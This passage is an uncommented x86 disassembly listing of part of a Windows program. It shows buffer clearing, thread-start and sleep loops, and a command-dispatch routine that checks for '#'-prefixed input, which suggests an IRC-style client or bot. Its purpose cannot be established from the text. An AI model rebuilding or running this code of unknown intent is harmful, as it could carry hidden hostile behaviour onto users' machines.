13149d57:	b8 68 d5 14 13       	mov    $0x1314d568,%eax
13149d5c:	85 f6                	test   %esi,%esi
13149d5e:	75 05                	jne    0x13149d65
13149d60:	b8 28 d5 14 13       	mov    $0x1314d528,%eax
13149d65:	8d 4d bc             	lea    -0x44(%ebp),%ecx
13149d68:	6a 40                	push   $0x40
13149d6a:	51                   	push   %ecx
13149d6b:	50                   	push   %eax
13149d6c:	e8 df 89 ff ff       	call   0x13142750
13149d71:	83 c4 0c             	add    $0xc,%esp
13149d74:	b8 f0 d5 14 13       	mov    $0x1314d5f0,%eax
13149d79:	85 f6                	test   %esi,%esi
13149d7b:	75 05                	jne    0x13149d82
13149d7d:	b8 b0 d5 14 13       	mov    $0x1314d5b0,%eax
13149d82:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
13149d88:	6a 40                	push   $0x40
13149d8a:	51                   	push   %ecx
13149d8b:	50                   	push   %eax
13149d8c:	e8 bf 89 ff ff       	call   0x13142750
13149d91:	83 c4 0c             	add    $0xc,%esp
13149d94:	85 f6                	test   %esi,%esi
13149d96:	5e                   	pop    %esi
13149d97:	75 08                	jne    0x13149da1
13149d99:	8b 45 10             	mov    0x10(%ebp),%eax
13149d9c:	a3 a8 d5 14 13       	mov    %eax,0x1314d5a8
13149da1:	c9                   	leave  
13149da2:	c3                   	ret    
13149da3:	55                   	push   %ebp
13149da4:	8b ec                	mov    %esp,%ebp
13149da6:	53                   	push   %ebx
13149da7:	8b 5d 08             	mov    0x8(%ebp),%ebx
13149daa:	56                   	push   %esi
13149dab:	57                   	push   %edi
13149dac:	bf 00 04 00 00       	mov    $0x400,%edi
13149db1:	8d 83 00 02 00 00    	lea    0x200(%ebx),%eax
13149db7:	57                   	push   %edi
13149db8:	6a 00                	push   $0x0
13149dba:	50                   	push   %eax
13149dbb:	e8 62 88 ff ff       	call   0x13142622
13149dc0:	be 00 01 00 00       	mov    $0x100,%esi
13149dc5:	8d 83 00 01 00 00    	lea    0x100(%ebx),%eax
13149dcb:	56                   	push   %esi
13149dcc:	6a 00                	push   $0x0
13149dce:	50                   	push   %eax
13149dcf:	e8 4e 88 ff ff       	call   0x13142622
13149dd4:	56                   	push   %esi
13149dd5:	6a 00                	push   $0x0
13149dd7:	53                   	push   %ebx
13149dd8:	e8 45 88 ff ff       	call   0x13142622
13149ddd:	57                   	push   %edi
13149dde:	8b 7d 0c             	mov    0xc(%ebp),%edi
13149de1:	33 db                	xor    %ebx,%ebx
13149de3:	8d 87 00 02 00 00    	lea    0x200(%edi),%eax
13149de9:	53                   	push   %ebx
13149dea:	50                   	push   %eax
13149deb:	e8 32 88 ff ff       	call   0x13142622
13149df0:	56                   	push   %esi
13149df1:	8d 87 00 01 00 00    	lea    0x100(%edi),%eax
13149df7:	53                   	push   %ebx
13149df8:	50                   	push   %eax
13149df9:	e8 24 88 ff ff       	call   0x13142622
13149dfe:	56                   	push   %esi
13149dff:	53                   	push   %ebx
13149e00:	57                   	push   %edi
13149e01:	e8 1c 88 ff ff       	call   0x13142622
13149e06:	8b 7d 10             	mov    0x10(%ebp),%edi
13149e09:	83 c4 48             	add    $0x48,%esp
13149e0c:	c7 45 08 0a 00 00 00 	movl   $0xa,0x8(%ebp)
13149e13:	83 c6 80             	add    $0xffffff80,%esi
13149e16:	56                   	push   %esi
13149e17:	53                   	push   %ebx
13149e18:	57                   	push   %edi
13149e19:	e8 04 88 ff ff       	call   0x13142622
13149e1e:	83 c4 0c             	add    $0xc,%esp
13149e21:	03 fe                	add    %esi,%edi
13149e23:	ff 4d 08             	decl   0x8(%ebp)
13149e26:	75 ee                	jne    0x13149e16
13149e28:	5f                   	pop    %edi
13149e29:	5e                   	pop    %esi
13149e2a:	5b                   	pop    %ebx
13149e2b:	5d                   	pop    %ebp
13149e2c:	c3                   	ret    
13149e2d:	ff 35 98 a5 17 13    	pushl  0x1317a598
13149e33:	e8 8f f8 ff ff       	call   0x131496c7
13149e38:	85 c0                	test   %eax,%eax
13149e3a:	59                   	pop    %ecx
13149e3b:	75 0e                	jne    0x13149e4b
13149e3d:	39 05 98 a5 17 13    	cmp    %eax,0x1317a598
13149e43:	0f 94 c0             	sete   %al
13149e46:	a3 98 a5 17 13       	mov    %eax,0x1317a598
13149e4b:	a1 30 d6 14 13       	mov    0x1314d630,%eax
13149e50:	69 c0 e8 03 00 00    	imul   $0x3e8,%eax,%eax
13149e56:	50                   	push   %eax
13149e57:	ff 15 fc 36 15 13    	call   *0x131536fc
13149e5d:	eb ce                	jmp    0x13149e2d
13149e5f:	55                   	push   %ebp
13149e60:	8b ec                	mov    %esp,%ebp
13149e62:	81 ec 4c 05 00 00    	sub    $0x54c,%esp
13149e68:	53                   	push   %ebx
13149e69:	56                   	push   %esi
13149e6a:	57                   	push   %edi
13149e6b:	bb 00 01 00 00       	mov    $0x100,%ebx
13149e70:	33 ff                	xor    %edi,%edi
13149e72:	53                   	push   %ebx
13149e73:	be 70 97 17 13       	mov    $0x13179770,%esi
13149e78:	57                   	push   %edi
13149e79:	56                   	push   %esi
13149e7a:	e8 a3 87 ff ff       	call   0x13142622
13149e7f:	6a 2b                	push   $0x2b
13149e81:	56                   	push   %esi
13149e82:	68 e8 d4 14 13       	push   $0x1314d4e8
13149e87:	e8 f1 bd ff ff       	call   0x13145c7d
13149e8c:	83 c4 18             	add    $0x18,%esp
13149e8f:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
13149e93:	89 7d f8             	mov    %edi,-0x8(%ebp)
13149e96:	be 40 65 17 13       	mov    $0x13176540,%esi
13149e9b:	0f 85 a1 00 00 00    	jne    0x13149f42
13149ea1:	53                   	push   %ebx
13149ea2:	57                   	push   %edi
13149ea3:	56                   	push   %esi
13149ea4:	e8 79 87 ff ff       	call   0x13142622
13149ea9:	6a 2b                	push   $0x2b
13149eab:	56                   	push   %esi
13149eac:	68 3c d6 14 13       	push   $0x1314d63c
13149eb1:	e8 c7 bd ff ff       	call   0x13145c7d
13149eb6:	83 c4 18             	add    $0x18,%esp
13149eb9:	be 58 67 17 13       	mov    $0x13176758,%esi
13149ebe:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
13149ec2:	75 18                	jne    0x13149edc
13149ec4:	8d 45 d0             	lea    -0x30(%ebp),%eax
13149ec7:	50                   	push   %eax
13149ec8:	57                   	push   %edi
13149ec9:	57                   	push   %edi
13149eca:	68 2d 9e 14 13       	push   $0x13149e2d
13149ecf:	57                   	push   %edi
13149ed0:	57                   	push   %edi
13149ed1:	ff 15 30 37 15 13    	call   *0x13153730
13149ed7:	a3 84 a5 17 13       	mov    %eax,0x1317a584
13149edc:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
13149ee0:	0f 85 d1 00 00 00    	jne    0x13149fb7
13149ee6:	a1 94 a5 17 13       	mov    0x1317a594,%eax
13149eeb:	8b 0d 60 d4 14 13    	mov    0x1314d460,%ecx
13149ef1:	3b c7                	cmp    %edi,%eax
13149ef3:	75 06                	jne    0x13149efb
13149ef5:	8b 0d 5c d4 14 13    	mov    0x1314d45c,%ecx
13149efb:	3b c7                	cmp    %edi,%eax
13149efd:	b8 1c d4 14 13       	mov    $0x1314d41c,%eax
13149f02:	75 05                	jne    0x13149f09
13149f04:	b8 dc d3 14 13       	mov    $0x1314d3dc,%eax
13149f09:	51                   	push   %ecx
13149f0a:	50                   	push   %eax
13149f0b:	e8 5a ed ff ff       	call   0x13148c6a
13149f10:	59                   	pop    %ecx
13149f11:	85 c0                	test   %eax,%eax
13149f13:	59                   	pop    %ecx
13149f14:	75 59                	jne    0x13149f6f
13149f16:	a1 24 d3 14 13       	mov    0x1314d324,%eax
13149f1b:	48                   	dec    %eax
13149f1c:	39 45 f8             	cmp    %eax,-0x8(%ebp)
13149f1f:	7c 34                	jl     0x13149f55
13149f21:	ff 35 28 d3 14 13    	pushl  0x1314d328
13149f27:	33 c0                	xor    %eax,%eax
13149f29:	39 3d 94 a5 17 13    	cmp    %edi,0x1317a594
13149f2f:	89 7d f8             	mov    %edi,-0x8(%ebp)
13149f32:	0f 94 c0             	sete   %al
13149f35:	a3 94 a5 17 13       	mov    %eax,0x1317a594
13149f3a:	ff 15 fc 36 15 13    	call   *0x131536fc
13149f40:	eb 16                	jmp    0x13149f58
13149f42:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
13149f46:	0f 84 6d ff ff ff    	je     0x13149eb9
13149f4c:	5f                   	pop    %edi
13149f4d:	5e                   	pop    %esi
13149f4e:	33 c0                	xor    %eax,%eax
13149f50:	5b                   	pop    %ebx
13149f51:	c9                   	leave  
13149f52:	c2 04 00             	ret    $0x4
13149f55:	ff 45 f8             	incl   -0x8(%ebp)
13149f58:	a1 14 d3 14 13       	mov    0x1314d314,%eax
13149f5d:	69 c0 e8 03 00 00    	imul   $0x3e8,%eax,%eax
13149f63:	50                   	push   %eax
13149f64:	ff 15 fc 36 15 13    	call   *0x131536fc
13149f6a:	e9 77 ff ff ff       	jmp    0x13149ee6
13149f6f:	57                   	push   %edi
13149f70:	68 e4 d4 14 13       	push   $0x1314d4e4
13149f75:	e8 63 ec ff ff       	call   0x13148bdd
13149f7a:	50                   	push   %eax
13149f7b:	e8 03 ee ff ff       	call   0x13148d83
13149f80:	83 c4 0c             	add    $0xc,%esp
13149f83:	85 c0                	test   %eax,%eax
13149f85:	75 0a                	jne    0x13149f91
13149f87:	e8 ec ee ff ff       	call   0x13148e78
13149f8c:	e9 2d ff ff ff       	jmp    0x13149ebe
13149f91:	68 80 00 00 00       	push   $0x80
13149f96:	57                   	push   %edi
13149f97:	56                   	push   %esi
13149f98:	e8 85 86 ff ff       	call   0x13142622
13149f9d:	6a 2b                	push   $0x2b
13149f9f:	56                   	push   %esi
13149fa0:	68 64 d4 14 13       	push   $0x1314d464
13149fa5:	e8 d3 bc ff ff       	call   0x13145c7d
13149faa:	56                   	push   %esi
13149fab:	e8 8a ee ff ff       	call   0x13148e3a
13149fb0:	83 c4 1c             	add    $0x1c,%esp
13149fb3:	85 c0                	test   %eax,%eax
13149fb5:	74 d0                	je     0x13149f87
13149fb7:	8b 5d 08             	mov    0x8(%ebp),%ebx
13149fba:	69 db 04 06 00 00    	imul   $0x604,%ebx,%ebx
13149fc0:	8d 85 d0 fa ff ff    	lea    -0x530(%ebp),%eax
13149fc6:	50                   	push   %eax
13149fc7:	8d 83 64 74 17 13    	lea    0x13177464(%ebx),%eax
13149fcd:	50                   	push   %eax
13149fce:	8d 83 6c 93 17 13    	lea    0x1317936c(%ebx),%eax
13149fd4:	50                   	push   %eax
13149fd5:	e8 c9 fd ff ff       	call   0x13149da3
13149fda:	83 c4 0c             	add    $0xc,%esp
13149fdd:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
13149fe1:	75 5e                	jne    0x1314a041
13149fe3:	68 74 9f 17 13       	push   $0x13179f74
13149fe8:	e8 75 ef ff ff       	call   0x13148f62
13149fed:	8b f8                	mov    %eax,%edi
13149fef:	59                   	pop    %ecx
13149ff0:	85 ff                	test   %edi,%edi
13149ff2:	89 7d ec             	mov    %edi,-0x14(%ebp)
13149ff5:	0f 84 15 2a 00 00    	je     0x1314ca10
13149ffb:	be 58 67 17 13       	mov    $0x13176758,%esi
1314a000:	56                   	push   %esi
1314a001:	68 00 d1 14 13       	push   $0x1314d100
1314a006:	68 6c 81 17 13       	push   $0x1317816c
1314a00b:	ff 15 98 39 15 13    	call   *0x13153998
1314a011:	83 c4 0c             	add    $0xc,%esp
1314a014:	83 ff 05             	cmp    $0x5,%edi
1314a017:	75 0d                	jne    0x1314a026
1314a019:	68 74 9f 17 13       	push   $0x13179f74
1314a01e:	e8 17 ee ff ff       	call   0x13148e3a
1314a023:	59                   	pop    %ecx
1314a024:	eb 9a                	jmp    0x13149fc0
1314a026:	83 ff 04             	cmp    $0x4,%edi
1314a029:	75 0c                	jne    0x1314a037
1314a02b:	68 74 a1 17 13       	push   $0x1317a174
1314a030:	e8 b8 f2 ff ff       	call   0x131492ed
1314a035:	eb ec                	jmp    0x1314a023
1314a037:	83 ff 06             	cmp    $0x6,%edi
1314a03a:	75 0d                	jne    0x1314a049
1314a03c:	e9 92 00 00 00       	jmp    0x1314a0d3
1314a041:	8b 7d ec             	mov    -0x14(%ebp),%edi
1314a044:	be 58 67 17 13       	mov    $0x13176758,%esi
1314a049:	83 ff 08             	cmp    $0x8,%edi
1314a04c:	0f 84 6e ff ff ff    	je     0x13149fc0
1314a052:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
1314a056:	0f 85 92 00 00 00    	jne    0x1314a0ee
1314a05c:	83 ff 07             	cmp    $0x7,%edi
1314a05f:	75 5c                	jne    0x1314a0bd
1314a061:	56                   	push   %esi
1314a062:	68 74 a1 17 13       	push   $0x1317a174
1314a067:	e8 c0 86 ff ff       	call   0x1314272c
1314a06c:	59                   	pop    %ecx
1314a06d:	85 c0                	test   %eax,%eax
1314a06f:	59                   	pop    %ecx
1314a070:	0f 84 4a ff ff ff    	je     0x13149fc0
1314a076:	68 74 a1 17 13       	push   $0x1317a174
1314a07b:	6a 02                	push   $0x2
1314a07d:	e8 61 eb ff ff       	call   0x13148be3
1314a082:	59                   	pop    %ecx
1314a083:	50                   	push   %eax
1314a084:	68 00 22 15 13       	push   $0x13152200
1314a089:	68 6c 82 17 13       	push   $0x1317826c
1314a08e:	ff 15 98 39 15 13    	call   *0x13153998
1314a094:	83 c4 10             	add    $0x10,%esp
1314a097:	b9 81 01 00 00       	mov    $0x181,%ecx
1314a09c:	be 6c 80 17 13       	mov    $0x1317806c,%esi
1314a0a1:	6a 02                	push   $0x2
1314a0a3:	81 ec 04 06 00 00    	sub    $0x604,%esp
1314a0a9:	8b fc                	mov    %esp,%edi
1314a0ab:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
1314a0ad:	e8 3a ea ff ff       	call   0x13148aec
1314a0b2:	81 c4 08 06 00 00    	add    $0x608,%esp
1314a0b8:	e9 03 ff ff ff       	jmp    0x13149fc0
1314a0bd:	83 ff 09             	cmp    $0x9,%edi
1314a0c0:	75 50                	jne    0x1314a112
1314a0c2:	56                   	push   %esi
1314a0c3:	68 74 a1 17 13       	push   $0x1317a174
1314a0c8:	e8 5f 86 ff ff       	call   0x1314272c
1314a0cd:	59                   	pop    %ecx
1314a0ce:	85 c0                	test   %eax,%eax
1314a0d0:	59                   	pop    %ecx
1314a0d1:	75 06                	jne    0x1314a0d9
1314a0d3:	56                   	push   %esi
1314a0d4:	e9 45 ff ff ff       	jmp    0x1314a01e
1314a0d9:	68 74 a1 17 13       	push   $0x1317a174
1314a0de:	6a 02                	push   $0x2
1314a0e0:	e8 fe ea ff ff       	call   0x13148be3
1314a0e5:	59                   	pop    %ecx
1314a0e6:	50                   	push   %eax
1314a0e7:	68 ec 21 15 13       	push   $0x131521ec
1314a0ec:	eb 9b                	jmp    0x1314a089
1314a0ee:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
1314a0f2:	75 1e                	jne    0x1314a112
1314a0f4:	68 f4 01 00 00       	push   $0x1f4
1314a0f9:	ff 15 fc 36 15 13    	call   *0x131536fc
1314a0ff:	68 70 99 17 13       	push   $0x13179970
1314a104:	e8 2f f6 ff ff       	call   0x13149738
1314a109:	85 c0                	test   %eax,%eax
1314a10b:	59                   	pop    %ecx
1314a10c:	0f 84 ae fe ff ff    	je     0x13149fc0
1314a112:	8b 45 08             	mov    0x8(%ebp),%eax
1314a115:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
1314a119:	c1 e0 0b             	shl    $0xb,%eax
1314a11c:	be 00 08 00 00       	mov    $0x800,%esi
1314a121:	8d b8 70 7e 17 13    	lea    0x13177e70(%eax),%edi
1314a127:	56                   	push   %esi
1314a128:	6a 00                	push   $0x0
1314a12a:	57                   	push   %edi
1314a12b:	89 7d fc             	mov    %edi,-0x4(%ebp)
1314a12e:	e8 ef 84 ff ff       	call   0x13142622
1314a133:	56                   	push   %esi
1314a134:	6a 00                	push   $0x0
1314a136:	57                   	push   %edi
1314a137:	e8 e6 84 ff ff       	call   0x13142622
1314a13c:	83 c4 18             	add    $0x18,%esp
1314a13f:	85 c0                	test   %eax,%eax
1314a141:	0f 84 79 fe ff ff    	je     0x13149fc0
1314a147:	6a 00                	push   $0x0
1314a149:	6a 7c                	push   $0x7c
1314a14b:	ff 75 f4             	pushl  -0xc(%ebp)
1314a14e:	8d 83 6c 95 17 13    	lea    0x1317956c(%ebx),%eax
1314a154:	57                   	push   %edi
1314a155:	50                   	push   %eax
1314a156:	e8 5a b3 ff ff       	call   0x131454b5
1314a15b:	83 c4 14             	add    $0x14,%esp
1314a15e:	85 c0                	test   %eax,%eax
1314a160:	0f 84 5a fe ff ff    	je     0x13149fc0
1314a166:	8a 07                	mov    (%edi),%al
1314a168:	84 c0                	test   %al,%al
1314a16a:	0f 84 50 fe ff ff    	je     0x13149fc0
1314a170:	ff 45 f4             	incl   -0xc(%ebp)
1314a173:	3a 05 54 d3 14 13    	cmp    0x1314d354,%al
1314a179:	8a 0d 55 d3 14 13    	mov    0x1314d355,%cl
1314a17f:	74 37                	je     0x1314a1b8
1314a181:	3a c1                	cmp    %cl,%al
1314a183:	74 37                	je     0x1314a1bc
1314a185:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
1314a189:	0f 85 9d 27 00 00    	jne    0x1314c92c
1314a18f:	68 dc 21 15 13       	push   $0x131521dc
1314a194:	68 68 7c 17 13       	push   $0x13177c68
1314a199:	ff 15 98 39 15 13    	call   *0x13153998
1314a19f:	59                   	pop    %ecx
1314a1a0:	be 68 7a 17 13       	mov    $0x13177a68,%esi
1314a1a5:	59                   	pop    %ecx
1314a1a6:	6a 01                	push   $0x1
1314a1a8:	b9 81 01 00 00       	mov    $0x181,%ecx
1314a1ad:	81 ec 04 06 00 00    	sub    $0x604,%esp
1314a1b3:	e9 65 27 00 00       	jmp    0x1314c91d
1314a1b8:	3a c1                	cmp    %cl,%al
1314a1ba:	75 12                	jne    0x1314a1ce
1314a1bc:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
1314a1c0:	75 0c                	jne    0x1314a1ce
1314a1c2:	c7 05 44 45 17 13 01 	movl   $0x1,0x13174544
1314a1c9:	00 00 00 
1314a1cc:	eb 07                	jmp    0x1314a1d5
1314a1ce:	83 25 44 45 17 13 00 	andl   $0x0,0x13174544
1314a1d5:	8d b3 64 75 17 13    	lea    0x13177564(%ebx),%esi
1314a1db:	68 00 01 00 00       	push   $0x100
1314a1e0:	6a 00                	push   $0x0
1314a1e2:	56                   	push   %esi
1314a1e3:	e8 3a 84 ff ff       	call   0x13142622
1314a1e8:	83 c4 0c             	add    $0xc,%esp
1314a1eb:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
1314a1ef:	75 57                	jne    0x1314a248
1314a1f1:	80 3d 74 a0 17 13 23 	cmpb   $0x23,0x1317a074
1314a1f8:	75 1f                	jne    0x1314a219
1314a1fa:	68 74 a0 17 13       	push   $0x1317a074
1314a1ff:	e8 f9 84 ff ff       	call   0x131426fd
1314a204:	50                   	push   %eax
1314a205:	68 74 a0 17 13       	push   $0x1317a074
1314a20a:	68 6c 81 17 13       	push   $0x1317816c
1314a20f:	e8 3c 85 ff ff       	call   0x13142750
1314a214:	83 c4 10             	add    $0x10,%esp
1314a217:	eb 2f                	jmp    0x1314a248
1314a219:	68 d8 21 15 13       	push   $0x131521d8
1314a21e:	68 74 9f 17 13       	push   $0x13179f74
1314a223:	e8 15 84 ff ff       	call   0x1314263d
1314a228:	b9 fc f9 ff ff       	mov    $0xfffff9fc,%ecx
1314a22d:	81 e9 70 99 17 13    	sub    $0x13179970,%ecx
1314a233:	03 c1                	add    %ecx,%eax
1314a235:	50                   	push   %eax
1314a236:	68 74 9f 17 13       	push   $0x13179f74
1314a23b:	68 6c 81 17 13       	push   $0x1317816c
1314a240:	e8 0b 85 ff ff       	call   0x13142750
1314a245:	83 c4 14             	add    $0x14,%esp
1314a248:	68 80 00 00 00       	push   $0x80
1314a24d:	8d 85 d0 fa ff ff    	lea    -0x530(%ebp),%eax
1314a253:	6a 00                	push   $0x0
1314a255:	50                   	push   %eax
1314a256:	e8 c7 83 ff ff       	call   0x13142622
1314a25b:	8d 85 d0 fa ff ff    	lea    -0x530(%ebp),%eax
1314a261:	6a 00                	push   $0x0
1314a263:	50                   	push   %eax
1314a264:	57                   	push   %edi
1314a265:	e8 08 b3 ff ff       	call   0x13145572
1314a26a:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314a270:	68 d0 21 15 13       	push   $0x131521d0
1314a275:	50                   	push   %eax
1314a276:	e8 b1 84 ff ff       	call   0x1314272c
1314a27b:	83 c4 20             	add    $0x20,%esp
1314a27e:	85 c0                	test   %eax,%eax
1314a280:	0f 85 08 01 00 00    	jne    0x1314a38e
1314a286:	8d b3 6c 93 17 13    	lea    0x1317936c(%ebx),%esi
1314a28c:	68 88 45 17 13       	push   $0x13174588
1314a291:	56                   	push   %esi
1314a292:	e8 95 84 ff ff       	call   0x1314272c
1314a297:	59                   	pop    %ecx
1314a298:	85 c0                	test   %eax,%eax
1314a29a:	59                   	pop    %ecx
1314a29b:	75 28                	jne    0x1314a2c5
1314a29d:	8d 83 6c 93 17 13    	lea    0x1317936c(%ebx),%eax
1314a2a3:	50                   	push   %eax
1314a2a4:	ff 75 08             	pushl  0x8(%ebp)
1314a2a7:	e8 37 e9 ff ff       	call   0x13148be3
1314a2ac:	59                   	pop    %ecx
1314a2ad:	50                   	push   %eax
1314a2ae:	68 a4 21 15 13       	push   $0x131521a4
1314a2b3:	8d 83 64 76 17 13    	lea    0x13177664(%ebx),%eax
1314a2b9:	50                   	push   %eax
1314a2ba:	ff 15 98 39 15 13    	call   *0x13153998
1314a2c0:	e9 0d 26 00 00       	jmp    0x1314c8d2
1314a2c5:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314a2cb:	6a 01                	push   $0x1
1314a2cd:	50                   	push   %eax
1314a2ce:	57                   	push   %edi
1314a2cf:	e8 9e b2 ff ff       	call   0x13145572
1314a2d4:	83 c4 0c             	add    $0xc,%esp
1314a2d7:	85 c0                	test   %eax,%eax
1314a2d9:	0f 84 4d 26 00 00    	je     0x1314c92c
1314a2df:	83 3d 10 24 15 13 00 	cmpl   $0x0,0x13152410
1314a2e6:	74 15                	je     0x1314a2fd
1314a2e8:	68 f4 23 15 13       	push   $0x131523f4
1314a2ed:	68 70 97 17 13       	push   $0x13179770
1314a2f2:	56                   	push   %esi
1314a2f3:	e8 6e b6 ff ff       	call   0x13145966
1314a2f8:	83 c4 0c             	add    $0xc,%esp
1314a2fb:	eb 05                	jmp    0x1314a302
1314a2fd:	b8 70 97 17 13       	mov    $0x13179770,%eax
1314a302:	50                   	push   %eax
1314a303:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314a309:	50                   	push   %eax
1314a30a:	e8 1d 84 ff ff       	call   0x1314272c
1314a30f:	59                   	pop    %ecx
1314a310:	85 c0                	test   %eax,%eax
1314a312:	59                   	pop    %ecx
1314a313:	0f 85 f0 25 00 00    	jne    0x1314c909
1314a319:	56                   	push   %esi
1314a31a:	be 88 45 17 13       	mov    $0x13174588,%esi
1314a31f:	68 00 d1 14 13       	push   $0x1314d100
1314a324:	56                   	push   %esi
1314a325:	ff 15 98 39 15 13    	call   *0x13153998
1314a32b:	83 c4 0c             	add    $0xc,%esp
1314a32e:	56                   	push   %esi
1314a32f:	ff 75 08             	pushl  0x8(%ebp)
1314a332:	e8 ac e8 ff ff       	call   0x13148be3
1314a337:	59                   	pop    %ecx
1314a338:	50                   	push   %eax
1314a339:	ff 75 08             	pushl  0x8(%ebp)
1314a33c:	e8 bd e8 ff ff       	call   0x13148bfe
1314a341:	59                   	pop    %ecx
1314a342:	50                   	push   %eax
1314a343:	ff 75 08             	pushl  0x8(%ebp)
1314a346:	e8 98 e8 ff ff       	call   0x13148be3
1314a34b:	59                   	pop    %ecx
1314a34c:	50                   	push   %eax
1314a34d:	8d 83 64 76 17 13    	lea    0x13177664(%ebx),%eax
1314a353:	68 88 21 15 13       	push   $0x13152188
1314a358:	50                   	push   %eax
1314a359:	ff 15 98 39 15 13    	call   *0x13153998
1314a35f:	83 c4 18             	add    $0x18,%esp
1314a362:	83 3d 34 d1 14 13 00 	cmpl   $0x0,0x1314d134
1314a369:	0f 84 9a 25 00 00    	je     0x1314c909
1314a36f:	80 bb 6c 94 17 13 23 	cmpb   $0x23,0x1317946c(%ebx)
1314a376:	8d 83 6c 94 17 13    	lea    0x1317946c(%ebx),%eax
1314a37c:	0f 85 87 25 00 00    	jne    0x1314c909
1314a382:	50                   	push   %eax
1314a383:	56                   	push   %esi
1314a384:	e8 9c ef ff ff       	call   0x13149325
1314a389:	e9 5b 25 00 00       	jmp    0x1314c8e9
1314a38e:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
1314a392:	75 2c                	jne    0x1314a3c0
1314a394:	68 88 45 17 13       	push   $0x13174588
1314a399:	68 74 9f 17 13       	push   $0x13179f74
1314a39e:	e8 89 83 ff ff       	call   0x1314272c
1314a3a3:	59                   	pop    %ecx
1314a3a4:	85 c0                	test   %eax,%eax
1314a3a6:	59                   	pop    %ecx
1314a3a7:	0f 85 7f 25 00 00    	jne    0x1314c92c
1314a3ad:	68 88 45 17 13       	push   $0x13174588
1314a3b2:	e8 46 83 ff ff       	call   0x131426fd
1314a3b7:	85 c0                	test   %eax,%eax
1314a3b9:	59                   	pop    %ecx
1314a3ba:	0f 84 6c 25 00 00    	je     0x1314c92c
1314a3c0:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314a3c6:	68 80 21 15 13       	push   $0x13152180
1314a3cb:	50                   	push   %eax
1314a3cc:	e8 5b 83 ff ff       	call   0x1314272c
1314a3d1:	59                   	pop    %ecx
1314a3d2:	85 c0                	test   %eax,%eax
1314a3d4:	59                   	pop    %ecx
1314a3d5:	75 5d                	jne    0x1314a434
1314a3d7:	68 88 45 17 13       	push   $0x13174588
1314a3dc:	ff 75 08             	pushl  0x8(%ebp)
1314a3df:	e8 ff e7 ff ff       	call   0x13148be3
1314a3e4:	59                   	pop    %ecx
1314a3e5:	50                   	push   %eax
1314a3e6:	8d 83 64 76 17 13    	lea    0x13177664(%ebx),%eax
1314a3ec:	68 70 21 15 13       	push   $0x13152170
1314a3f1:	50                   	push   %eax
1314a3f2:	ff 15 98 39 15 13    	call   *0x13153998
1314a3f8:	83 c4 10             	add    $0x10,%esp
1314a3fb:	b9 81 01 00 00       	mov    $0x181,%ecx
1314a400:	8d b3 64 74 17 13    	lea    0x13177464(%ebx),%esi
1314a406:	ff 75 08             	pushl  0x8(%ebp)
1314a409:	81 ec 04 06 00 00    	sub    $0x604,%esp
1314a40f:	8b fc                	mov    %esp,%edi
1314a411:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
1314a413:	e8 d4 e6 ff ff       	call   0x13148aec
1314a418:	68 00 01 00 00       	push   $0x100
1314a41d:	6a 00                	push   $0x0
1314a41f:	68 88 45 17 13       	push   $0x13174588
1314a424:	e8 f9 81 ff ff       	call   0x13142622
1314a429:	81 c4 14 06 00 00    	add    $0x614,%esp
1314a42f:	e9 f8 24 00 00       	jmp    0x1314c92c
1314a434:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314a43a:	68 68 21 15 13       	push   $0x13152168
1314a43f:	50                   	push   %eax
1314a440:	e8 e7 82 ff ff       	call   0x1314272c
1314a445:	59                   	pop    %ecx
1314a446:	85 c0                	test   %eax,%eax
1314a448:	59                   	pop    %ecx
1314a449:	75 5a                	jne    0x1314a4a5
1314a44b:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314a451:	6a 01                	push   $0x1
1314a453:	50                   	push   %eax
1314a454:	57                   	push   %edi
1314a455:	e8 18 b1 ff ff       	call   0x13145572
1314a45a:	83 c4 0c             	add    $0xc,%esp
1314a45d:	85 c0                	test   %eax,%eax
1314a45f:	75 0a                	jne    0x1314a46b
1314a461:	68 68 21 15 13       	push   $0x13152168
1314a466:	e9 b6 04 00 00       	jmp    0x1314a921
1314a46b:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314a471:	50                   	push   %eax
1314a472:	e8 86 82 ff ff       	call   0x131426fd
1314a477:	59                   	pop    %ecx
1314a478:	83 f8 03             	cmp    $0x3,%eax
1314a47b:	68 d8 0d 15 13       	push   $0x13150dd8
1314a480:	57                   	push   %edi
1314a481:	7d 11                	jge    0x1314a494
1314a483:	e8 b5 81 ff ff       	call   0x1314263d
1314a488:	40                   	inc    %eax
1314a489:	50                   	push   %eax
1314a48a:	68 60 21 15 13       	push   $0x13152160
1314a48f:	e9 af 21 00 00       	jmp    0x1314c643
1314a494:	e8 a4 81 ff ff       	call   0x1314263d
1314a499:	40                   	inc    %eax
1314a49a:	50                   	push   %eax
1314a49b:	68 00 d1 14 13       	push   $0x1314d100
1314a4a0:	e9 9e 21 00 00       	jmp    0x1314c643
1314a4a5:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314a4ab:	68 5c 21 15 13       	push   $0x1315215c
1314a4b0:	50                   	push   %eax
1314a4b1:	e8 76 82 ff ff       	call   0x1314272c
1314a4b6:	59                   	pop    %ecx
1314a4b7:	85 c0                	test   %eax,%eax
1314a4b9:	59                   	pop    %ecx
1314a4ba:	0f 85 6b 04 00 00    	jne    0x1314a92b
1314a4c0:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314a4c6:	6a 01                	push   $0x1
1314a4c8:	50                   	push   %eax
1314a4c9:	57                   	push   %edi
